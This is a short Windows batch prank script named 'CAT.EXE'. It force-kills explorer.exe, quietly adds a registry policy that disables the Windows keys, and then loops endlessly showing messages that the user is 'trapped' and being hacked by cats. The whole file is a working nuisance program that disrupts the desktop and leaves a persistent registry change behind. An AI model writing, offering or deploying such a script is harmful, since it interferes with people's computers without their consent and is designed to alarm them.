@echo off
color 1F
title 🐾 CAT.EXE 
mode con: cols=160 lines=900
taskkill /f /im explorer.exe >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f >nul

:loop
cls
echo.
echo You are now trapped in cat.exe 
echo 🐾 cats hacking have begun... 
echo 💤 Press ALT + F4 to escape... if you dare...
timeout /t 1 >nul
goto loop
